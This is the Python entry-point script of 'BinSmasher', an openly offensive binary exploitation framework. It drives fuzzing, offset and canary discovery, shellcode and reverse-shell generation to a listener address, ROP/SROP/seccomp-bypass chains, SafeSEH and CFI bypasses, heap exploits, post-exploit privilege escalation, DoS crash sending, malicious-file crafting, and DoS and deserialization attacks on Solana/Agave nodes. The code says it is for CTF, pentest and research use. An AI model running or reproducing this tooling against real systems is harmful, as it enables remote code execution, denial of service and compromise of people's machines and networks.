#!/usr/bin/env python3
"""BinSmasher – main.py  v4"""

import sys, argparse, subprocess, logging, os
from rich.console import Console
from rich.panel import Panel
from utils import ExploitConfig, RichHelpFormatter, setup_logging, print_summary
from analyzer import BinaryAnalyzer
from fuzzer import Fuzzer
from exploiter import ExploitGenerator

console = Console()
log: logging.Logger = None


def get_banner():
    try:
        text = subprocess.check_output(["figlet","-f","slant","BinSmasher"],
                                        stderr=subprocess.DEVNULL).decode()
    except:
        text = ("  ____  _      _____                      __\n"
                " / __ )(_)___ / ___/____ ___  ____ ______/ /_  ___  _____\n"
                "/ __  / / __ \\\\__ \\/ __ `__ \\/ __ `/ ___/ __ \\/ _ \\/ ___/\n"
                "/ /_/ / / / / /__/ / / / / / / /_/ (__  ) / / /  __/ /\n"
                "/_____/_/_/ /_/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/\n")
    return (f"[bold cyan]{text}[/]\n"
            "[bold white]Ultimate Cross-Platform Binary Exploitation Framework[/]\n"
            "[dim]Authorized use only: CTF · pentest · security research[/]")


def build_parser():
    parser = argparse.ArgumentParser(
        description="BinSmasher — binary exploitation framework",
        formatter_class=RichHelpFormatter,
        epilog="Subcommands:\n  binary   Exploit native ELF/PE binaries\n"
               "  solana   Agave / Solana SVM security audit\n  file     Generate malicious files\n")
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── binary ──────────────────────────────────────────────────────────────
    bp = sub.add_parser("binary", help="Exploit native binaries", formatter_class=RichHelpFormatter)
    bp.add_argument("-b","--binary",  required=True, help="Path to target binary")
    bp.add_argument("-c","--cmd",     default="id",  help="Command to run via shellcode")
    bp.add_argument("-p","--pattern-size", type=int, default=200, help="Cyclic pattern size")
    bp.add_argument("-r","--return-addr",  default=None, help="Hex return address (auto if omitted)")
    bp.add_argument("--return-offset", type=int, default=80)
    bp.add_argument("-t","--test-exploit",  action="store_true", help="Fire exploit and verify output")
    bp.add_argument("-l","--log-file", default="binsmasher.log")

    net = bp.add_argument_group("network")
    net.add_argument("--host", default="localhost")
    net.add_argument("--port", type=int, default=4444)
    net.add_argument("--tls",  action="store_true", help="Use TLS for the connection")
    net.add_argument("--output-ip",   default="127.0.0.1", help="Listener IP for shellcode/revshell")
    net.add_argument("--output-port", type=int, default=6666, help="Listener port for shellcode/revshell")

    pay = bp.add_argument_group("payload")
    pay.add_argument("--reverse-shell", action="store_true", help="Generate reverse shell payload")
    pay.add_argument("--file-input", choices=["mp3","raw"], help="Embed payload inside a file format")
    pay.add_argument("--binary-args", default="", help="Args for target binary (quoted string)")

    fzg = bp.add_argument_group("fuzzing")
    fzg.add_argument("--fuzz",          action="store_true", help="boofuzz network fuzzing")
    fzg.add_argument("--mutation-fuzz", action="store_true", help="Built-in mutation fuzzer")
    fzg.add_argument("--afl-fuzz",      action="store_true", help="AFL++ coverage fuzzing")
    fzg.add_argument("--afl-timeout",   type=int, default=60, help="AFL++ runtime seconds")
    fzg.add_argument("--frida",         action="store_true", help="Frida dynamic analysis")
    fzg.add_argument("--protocol",      choices=["raw","http"], default="raw")

    adv = bp.add_argument_group("advanced exploits")
    adv.add_argument("--heap-exploit",        action="store_true", help="Heap exploitation path")
    adv.add_argument("--safeseh-bypass",      action="store_true", help="SafeSEH bypass (Windows)")
    adv.add_argument("--privilege-escalation",action="store_true", help="Post-exploit privesc")
    adv.add_argument("--cfi-bypass",          action="store_true", help="CFI valid-target pivot")
    adv.add_argument("--srop",  dest="force_srop", action="store_true",
                     help="Force Sigreturn-Oriented Programming chain")
    adv.add_argument("--orw",   dest="force_orw",  action="store_true",
                     help="Force open/read/write chain (seccomp sandbox bypass)")
    adv.add_argument("--flag-path", default="/flag",
                     help="Flag file path for ORW chain (default: /flag)")

    dos = bp.add_argument_group("dos / script generation")
    dos.add_argument("--dos", action="store_true",
                     help="DOS mode: find offset, crash target, write crash + exploit scripts")
    dos.add_argument("--generate-scripts", action="store_true",
                     help="Always write standalone crash_BINARY.py and exploit_BINARY.py")

    # ── solana ───────────────────────────────────────────────────────────────
    sp = sub.add_parser("solana", help="Agave / Solana SVM auditing", formatter_class=RichHelpFormatter)
    sp.add_argument("--rpc", default="http://localhost:8899", dest="solana_rpc")
    sp.add_argument("--source-path", default=None)
    sp.add_argument("-b","--binary", default=None)
    sp.add_argument("-l","--log-file", default="binsmasher_solana.log")
    sp.add_argument("--exploit-type", dest="agave_exploit_type",
                    choices=["svm-bpf","deser","dos-quic","snapshot-assert"])
    sp.add_argument("--bpf-fuzz", action="store_true")
    sp.add_argument("--host", default="localhost")
    sp.add_argument("--port", type=int, default=8900)

    # ── file ─────────────────────────────────────────────────────────────────
    fp = sub.add_parser("file", help="Generate malicious files", formatter_class=RichHelpFormatter)
    fp.add_argument("--format", required=True)
    fp.add_argument("--offset", type=int, default=256)
    fp.add_argument("--technique", choices=["overflow","fmtstr","inject"], default="overflow")
    fp.add_argument("--shellcode-hex", default=None)
    fp.add_argument("-o","--output-dir", default=".")
    fp.add_argument("--all-formats", action="store_true")
    fp.add_argument("-l","--log-file", default="binsmasher_file.log")

    return parser


def run_binary(cfg):
    global log
    analyzer  = BinaryAnalyzer(cfg.binary, cfg.log_file)
    platform, arch = analyzer.setup_context()

    findings, target_function, functions = analyzer.static_analysis()
    if not functions:
        log.error("No functions detected — cannot proceed.")
        print_summary(None,None,None,"None","Failed",None,None,
                      ["Run: r2 -c afl <binary> to verify functions"]); return

    (stack_exec, nx, aslr, canary_enabled,
     relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()

    fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
    exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                  cfg.log_file, cfg.tls, cfg.binary_args)

    if cfg.afl_fuzz:     fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
    if cfg.mutation_fuzz: fuzzer.mutation_fuzz()
    if cfg.fuzz:          fuzzer.fuzz_target(cfg.file_input, cfg.protocol, cfg.binary_args_list)
    if cfg.frida:         analyzer.frida_analyze(cfg.binary_args_list)

    lib_name, lib_version, offsets, base_addr = analyzer.load_library_offsets()

    offset, stack_addr, target_function = exploiter.find_offset(cfg.pattern_size, functions, retries=5)

    suggestions = []
    if offset is None or stack_addr is None:
        suggestions += [f"Verify server is running: nc -zv {cfg.host} {cfg.port}",
                        f"Inspect functions: r2 -c afl {cfg.binary}"]
        log.error("Could not determine offset or stack address.")
        print_summary(None,None,None,"None","Failed",None,target_function,suggestions); return

    # Detect fork-server → enable canary brute
    is_fork = exploiter._detect_fork_server()

    canary = None
    if canary_enabled:
        canary = exploiter.leak_canary(brute_force=is_fork)
        if not canary: suggestions.append("Canary leak failed — increase fmt string index range")

    # DOS mode
    if cfg.dos_only:
        crash_payload  = exploiter.generate_crash_payload(offset)
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(offset, canary, base_addr, offsets,
                                                            exploit_type="auto", binary_path=cfg.binary)
        console.print(Panel(
            f"Crash payload: [cyan]{len(crash_payload)}[/] bytes\n"
            f"Crash script:  [green]{crash_script}[/]\n"
            f"Exploit script:[green]{exploit_script}[/]",
            title="DOS / Script Generation", border_style="yellow"))
        if cfg.test_exploit:
            from pwn import remote
            try:
                conn = remote(cfg.host, cfg.port, timeout=5)
                conn.sendline(crash_payload)
                try: conn.recvall(timeout=2)
                except: pass
                conn.close()
                log.info("Crash payload sent — target should have crashed")
            except Exception as e: log.warning(f"Crash send failed: {e}")
        print_summary(offset, stack_addr, None, "dos_crash", "Success",
                      canary, target_function, suggestions,
                      nx=nx, pie=pie, relro=relro,
                      canary_enabled=canary_enabled, aslr=aslr); return

    fmt_payload = None
    if findings["format_string_functions"]:
        fmt_payload = exploiter.generate_format_string_payload(offset, relro)

    return_addr = int(cfg.return_addr, 16) if cfg.return_addr else (stack_addr + cfg.return_offset if stack_addr else 0)

    shellcode = None
    if not fmt_payload and not cfg.force_srop and not cfg.force_orw:
        shellcode = exploiter.generate_shellcode(cfg.cmd, cfg.output_ip, cfg.output_port,
                                                  arch, cfg.reverse_shell)
        if cfg.file_input:
            exploiter.craft_file_payload(cfg.file_input, offset, shellcode or b"\x90"*16)
        if not shellcode:
            log.error("Shellcode generation failed.")
            print_summary(offset, stack_addr, return_addr, "None", "Failed",
                          canary, target_function, suggestions,
                          nx=nx, pie=pie, relro=relro,
                          canary_enabled=canary_enabled, aslr=aslr); return

    if cfg.heap_exploit and findings["heap_functions"]:
        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
    if findings["heap_functions"]:
        exploiter.create_uaf_exploit(offset, base_addr, offsets)

    success, exploit_type, used_function = exploiter.create_exploit(
        offset=offset, shellcode=shellcode, return_addr=return_addr,
        test_exploit=cfg.test_exploit, return_offset=cfg.return_offset,
        nx=nx, aslr=aslr, canary_enabled=canary_enabled,
        format_string_payload=fmt_payload, functions=functions, file_input=cfg.file_input,
        canary=canary, relro=relro, safeseh=safeseh, cfg=cfg_flag,
        findings=findings, base_addr=base_addr, offsets=offsets,
        libc_version=lib_version or "2.31", pie=pie,
        force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    if cfg.cfi_bypass:
        log.info("Attempting CFI bypass…")
        cfi_chain = exploiter.cfi_bypass(offset, canary)
        if cfi_chain: log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")

    if platform == "windows":
        if cfg.safeseh_bypass: exploiter.create_safeseh_bypass(offset, safeseh)
        if cfg_flag == "Enabled": exploiter.cfg_bypass(offset)

    if success and cfg.privilege_escalation: exploiter.attempt_privilege_escalation()

    if cfg.generate_scripts:
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(offset, canary, base_addr, offsets,
                                                            exploit_type=exploit_type, binary_path=cfg.binary)
        log.info(f"Scripts written: {crash_script}, {exploit_script}")

    if success: suggestions.append("Exploit sent — verify output on your listener")
    else:
        suggestions += [
            "Try --heap-exploit for heap-based paths",
            "Try --mutation-fuzz to find additional crash inputs",
            "Try --srop to force Sigreturn-Oriented Programming chain",
            "Try --orw if target has seccomp sandbox blocking execve",
            "Try --ret2win for direct win function call",
            "Use gdb/r2 to inspect memory and verify offsets",
            "Increase --return-offset for ASLR brute",
        ]

    # For ret2win: show the actual win() address as Return Address
    display_return_addr = return_addr
    if exploit_type == "ret2win" and (not display_return_addr or display_return_addr < 0x1000):
        try:
            from pwn import ELF as _ELF, context as _ctx
            _WIN_KW = ["win","flag","shell","backdoor","secret","easy","print_flag","cat_flag"]
            _elf = _ELF(cfg.binary, checksec=False)
            for _n, _a in _elf.symbols.items():
                if _a and any(kw == _n.lower() or _n.lower().startswith(kw) for kw in _WIN_KW):
                    display_return_addr = _a
                    break
        except Exception:
            pass

    print_summary(offset, stack_addr, display_return_addr, exploit_type,
                  "Success" if success else "Failed",
                  canary, used_function or target_function, suggestions,
                  nx=nx, pie=pie, relro=relro,
                  canary_enabled=canary_enabled, aslr=aslr)


def run_solana(args):
    fuzzer = Fuzzer(args.binary or "/dev/null", args.host, args.port, args.log_file, "linux")
    if args.source_path and args.binary:
        analyzer = BinaryAnalyzer(args.binary, args.log_file)
        analyzer.grep_unsafe_source(args.source_path)
    if args.bpf_fuzz or args.agave_exploit_type == "svm-bpf": fuzzer.fuzz_bpf(args.solana_rpc)
    etype = args.agave_exploit_type
    if etype == "deser":             fuzzer.exploit_deser(args.solana_rpc)
    elif etype == "dos-quic":        fuzzer.dos_quic()
    elif etype == "snapshot-assert": fuzzer.exploit_snapshot_assert(args.solana_rpc)
    log.info("Solana/Agave audit completed.")


def run_file(args):
    global log
    from file_exploiter import FileExploiter
    fe = FileExploiter(output_dir=args.output_dir)
    sc = None
    if args.shellcode_hex:
        try: sc = bytes.fromhex(args.shellcode_hex.replace("\\x","").replace("0x",""))
        except Exception as e: log.error(f"Invalid shellcode hex: {e}"); return
    if args.all_formats:
        results = fe.craft_all(args.offset, sc, args.technique)
        console.print(Panel(f"Generated {len(results)} payloads in {args.output_dir}/",
                             title="File Exploiter", border_style="cyan"))
        for _, path in results: console.print(f"  [green]→[/] {path}")
    else:
        payload, path = fe.craft(args.format, args.offset, sc, args.technique)
        console.print(Panel(f"Payload: {path}\nSize: {len(payload)} bytes\n"
                            f"Format: {args.format}\nTechnique: {args.technique}",
                             title="File Exploiter", border_style="cyan"))


def main():
    global log
    parser = build_parser()
    args   = parser.parse_args()
    console.print(Panel(get_banner(), title="BinSmasher 🔨", border_style="cyan"))
    console.print(Panel(
        "[bold yellow]WARNING[/]: Use only on systems you own or have "
        "explicit written authorization to test.\nUnauthorized access is illegal.",
        title="⚠️  Ethics Notice", border_style="yellow"))

    if args.mode == "binary":
        cfg = ExploitConfig(
            binary=args.binary, host=args.host, port=args.port,
            pattern_size=args.pattern_size, return_addr=args.return_addr,
            return_offset=args.return_offset, test_exploit=args.test_exploit,
            log_file=args.log_file, output_ip=args.output_ip, output_port=args.output_port,
            reverse_shell=args.reverse_shell, cmd=args.cmd, fuzz=args.fuzz,
            afl_fuzz=args.afl_fuzz, frida=args.frida, file_input=args.file_input,
            protocol=args.protocol, tls=args.tls, heap_exploit=args.heap_exploit,
            safeseh_bypass=args.safeseh_bypass, privilege_escalation=args.privilege_escalation,
            binary_args=args.binary_args, afl_timeout=args.afl_timeout,
            mutation_fuzz=args.mutation_fuzz, cfi_bypass=args.cfi_bypass,
            force_srop=args.force_srop, force_orw=args.force_orw, flag_path=args.flag_path,
            dos_only=args.dos, generate_scripts=args.generate_scripts)
        log = setup_logging(cfg.log_file)
        cfg.validate()
        run_binary(cfg)
    elif args.mode == "solana":
        log = setup_logging(args.log_file)
        run_solana(args)
    elif args.mode == "file":
        log = setup_logging(args.log_file)
        run_file(args)


if __name__ == "__main__":
    main()
